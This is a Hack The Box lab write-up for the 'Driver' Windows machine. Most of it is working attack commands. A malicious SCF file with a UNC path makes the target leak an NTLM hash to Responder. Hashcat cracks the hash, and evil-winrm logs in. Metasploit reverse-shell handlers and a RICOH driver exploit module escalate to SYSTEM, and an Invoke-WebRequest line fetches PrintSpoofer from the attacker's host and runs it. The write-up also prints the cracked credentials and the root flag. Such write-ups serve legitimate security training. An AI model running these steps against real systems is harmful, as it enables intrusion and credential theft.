# Driver — Hack The Box Writeup

| Property | Value |
|----------|-------|
| **Box Name** | Driver |
| **IP** | 10.129.95.238 |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Tags** | `scf` `ntlm` `responder` `winrm` `ricoh` `printer-exploit` |

---

## Executive Summary

Driver is an easy-difficulty Windows machine on Hack The Box that illustrates the risk of unauthenticated file upload combined with NTLM relay attacks. The target runs a **MFP Firmware Update Center** web portal on port 80, protected only by default `admin:admin` credentials. The firmware upload endpoint accepts arbitrary file extensions, including `.scf` files — which can embed a UNC path that forces the server to authenticate to an attacker-controlled SMB endpoint. Responder captured **tony's NTLMv2 hash**, which was trivially cracked to `liltony`. Initial access was achieved via WinRM. Privilege escalation leveraged a vulnerable **RICOH PCL6 printer driver** to escalate from the standard user `tony` directly to `SYSTEM`.

---

## Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           DRIVER — Attack Chain                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Port 80 (HTTP)      SCF Upload       Responder       Hash Crack    WinRM  │
│  ┌──────────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐  ┌──────┐│
│  │ admin:admin  │───▶│ .scf     │───▶│ Capture  │───▶│ liltony │──▶│ tony ││
│  │ MFP Portal   │    │ payload  │    │ NTLMv2   │    │ cracked │  │ shell││
│  └──────────────┘    └──────────┘    └──────────┘    └──────────┘  └──┬───┘│
│                                                                       │    │
│  RICOH Driver PrivEsc                                              WinRM│    │
│  ┌──────────────────────────────┐    ┌──────────────────────────┐   │    │
│  │ ricoh_driver_privesc (migrate│───▶│ SYSTEM shell             │◀──┘    │
│  │ session 0 → session 1 first) │    │ Root flag captured       │        │
│  └──────────────────────────────┘    └──────────────────────────────┘       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Initial Access

### 1. Reconnaissance

**Nmap scan:**
```bash
nmap -sC -sV -Pn -oN nmap.initial 10.129.95.238
```

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds Microsoft Windows 7-10 (workgroup: WORKGROUP; signing disabled)
135/tcp  open  msrpc        Microsoft Windows RPC
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Key findings:
- Port 80: MFP Firmware Update Center — HTTP Basic Auth
- SMB signing **disabled** — ideal for relay attacks
- **Firewall allows 445 from 10.0.0.0/8** — enables NTLM capture
- WinRM (5985) open — ready for authenticated access

**Directory enumeration:**
```bash
feroxbuster -u http://driver.htb -x php -w /usr/share/wordlists/dirb/common.txt \
  --basic-auth admin:admin
# Discovered: /fw_up.php (firmware upload), /index.php, /images/ricoh.png
```

---

### 2. SCF File Upload — NTLM Hash Capture

**Why this works:** An SCF (Shell Command File) supports an `IconFile` directive pointing to a UNC path. When Windows Explorer processes the file, it attempts to authenticate to the UNC path — leaking the NTLM hash.

**Step A — Create malicious SCF:**
```bash
cat << 'EOF' > exploit.scf
[Shell]
Command=2
IconFile=\\10.10.14.X\smb\legit.ico
[Taskbar]
Command=ToggleDesktop
EOF
```
> ⚠️ Replace `10.10.14.X` with your HTB VPN IP (`ip a show tun0`).

**Step B — Start Responder:**
```bash
sudo responder -I tun0 -v
```

**Step C — Upload SCF via firmware portal:**
```bash
curl -u admin:admin \
  -F "file=@exploit.scf" \
  -F "submit=Upload" \
  "http://driver.htb/fw_up.php"
# → http://driver.htb/fw_up.php?msg=SUCCESS
```

**Step D — Hash captured:**
```
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:<challenge>:<ntproofstr>:<blob>
```

---

### 3. Hash Cracking

```bash
hashcat -m 5600 tony.hash /usr/share/wordlists/rockyou.txt -o cracked.txt -D 2
# Result: tony::DRIVER:...:liltony
```

| Username | Password |
|----------|----------|
| `tony`   | `liltony` |

---

### 4. WinRM Shell

```bash
evil-winrm -i 10.129.95.238 -u tony -p 'liltony'
# → Shell at C:\Users\tony\Documents
```

**User flag:**
```
C:\Users\tony\Documents> type ..\Desktop\user.txt
<user_flag>
```

---

## Privilege Escalation

### Enumeration Clues

**PowerShell history (`PSReadline`):**
```powershell
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

> 💡 **Key insight:** RICOH printer driver activity in user history = direct privesc signal.

**Print Spooler status:**
```powershell
Get-Service spooler
# Status: Running
```

---

### RICOH Driver Privilege Escalation

The RICOH PCL6 Universal Driver has full permissions on its directory, allowing a standard user to escalate to `SYSTEM`.

**Step 1 — Establish Meterpreter:**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.X
set LPORT 4444
run
```

**Step 2 — Migrate to interactive session (required!):**
```
# Meterpreter lands in Session 0 (non-interactive services session)
# Local exploits need Session 1+ (interactive desktop)

meterpreter > ps | grep explorer
748  660  explorer.exe x64 1 DRIVER\tony  ← Session 1 (INTERACTIVE)

meterpreter > migrate 748
# Or:
meterpreter > execute -f notepad.exe -H -c -i
meterpreter > ps | grep notepad
migrate <notepad_pid>
```

**Step 3 — Run RICOH exploit:**
```bash
background
use exploit/windows/local/ricoh_driver_privesc
set SESSION 2
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.X
set LPORT 1337
run
```

> ⚠️ Use **x64 payload** — the RICOH driver on this system is 64-bit. x86 payloads fail with architecture mismatch.

**Result:**
```
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Meterpreter session 3 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Root flag:**
```powershell
C:\Users\Administrator\Desktop> type root.txt
e7d73146dad66f3cce306fcf216987aa
```

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| **User** | `<user_flag>` | `C:\Users\tony\Desktop\user.txt` |
| **Root** | `e7d73146dad66f3cce306fcf216987aa` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Alternative Vectors

### PrintNightmare (CVE-2021-34527)

The Print Spooler service is running and tony can add printers — making this a valid alternative path:

```bash
# Metasploit
use exploit/windows/local/cve_2021_34527_printnightmare
set SESSION 1
set SMBUser tony
set SMBPass liltony
run

# Or PrintSpoofer (PowerShell)
Invoke-WebRequest -Uri http://10.10.14.X/PrintSpoofer.exe -OutFile C:\Users\tony\ps.exe
.\ps.exe -i -c cmd
```

RICOH was chosen as the primary vector because the specific driver was already identified in PSReadline history.

---

## Lessons Learned

| # | Lesson |
|---|--------|
| 1 | **SCF upload portals are NTLM goldmines.** Any file upload accepting arbitrary extensions on a Windows host is a candidate for SCF-based hash capture. |
| 2 | **PSReadline history is a privesc treasure map.** Windows stores PowerShell command history at `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. It often contains hints about installed software, driver names, and recent admin actions. |
| 3 | **Session interactivity is non-negotiable for local exploits.** Meterpreter sessions in Session 0 (services context) cannot execute most local privilege escalation exploits. Always migrate to an interactive desktop session (explorer.exe, notepad.exe) first. |
| 4 | **Architecture must match the target driver.** x64 driver → x64 payload. Architecture mismatch is a common failure mode when exploiting driver vulnerabilities. |
| 5 | **Box names are hints.** "DRIVER" on a print-themed box screams printer driver exploits (RICOH, PrintNightmare, etc.). |
| 6 | **Default credentials on internal portals are still common.** The `admin:admin` on the MFP portal was the entry point for the entire attack chain. |

---

## Full Documentation

Detailed technical documentation (recon, exploit, privesc) available at:
```
htb/boxes/retired/Driver/
├── recon.md     — Full reconnaissance notes
├── exploit.md   — Exploitation steps and alternatives
└── privesc.md   — Privilege escalation details
```
